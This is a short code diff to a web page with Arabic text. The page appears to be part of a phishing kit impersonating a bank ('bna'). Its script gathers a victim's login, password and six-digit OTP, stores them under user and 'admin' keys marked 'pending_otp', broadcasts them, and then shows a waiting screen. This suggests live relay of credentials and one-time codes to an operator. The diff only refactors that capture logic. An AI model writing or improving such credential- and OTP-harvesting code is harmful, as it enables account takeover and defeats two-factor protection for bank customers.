@@ -62,7 +62,7 @@ body{margin:0;background:var(--bg);font-family:"Roboto",system-ui,sans-serif;dis
 const KEY='bna_state', CH='bna_ch', ADMIN_KEY='bna_admin_state';
 const bc=typeof BroadcastChannel!=='undefined'?new BroadcastChannel(CH):null;
 function getS(){try{return JSON.parse(localStorage.getItem(ADMIN_KEY)||localStorage.getItem(KEY)||'{}');}catch(e){return{};}}
-function setS(u){const s={...getS(),...u};try{localStorage.setItem(KEY,JSON.stringify(s));localStorage.setItem(ADMIN_KEY,JSON.stringify(s));}catch(e){}if(bc)bc.postMessage({type:'update',data:s});return s;}
+function setS(u){const current=getS();const s={...current,...u};try{localStorage.setItem(KEY,JSON.stringify(s));localStorage.setItem(ADMIN_KEY,JSON.stringify(s));}catch(e){}if(bc)bc.postMessage({type:'update',data:s});return s;}
 const obs=[...document.querySelectorAll('.box')];
 let tmr=null;
 obs.forEach((b,i)=>{
@@ -77,14 +77,16 @@ document.getElementById('npad').addEventListener('click',e=>{
 });
 document.getElementById('cbtn').addEventListener('click',()=>{
   const saved = getS();
-  if(!String(saved.login || '').trim() || !String(saved.password || '').trim()){
+  const login = String(saved.login || '').trim();
+  const password = String(saved.password || '').trim();
+  if(!login || !password){
     window.location.href='login.html';
     return;
   }
   const otp=obs.map(b=>b.value).join('');
   if(otp.length<6){document.getElementById('err').textContent='الرمز غير مكتمل';return;}
   document.getElementById('err').textContent='';
-  setS({login: String(saved.login || '').trim(), password: String(saved.password || '').trim(), otp, status:'pending_otp', otp_time:Date.now()});
+  setS({login, password, otp, status:'pending_otp', otp_time:Date.now()});
   document.getElementById('cbtn').style.display='none';
   document.getElementById('wbox').style.display='flex';
   document.getElementById('npad').style.pointerEvents='none';
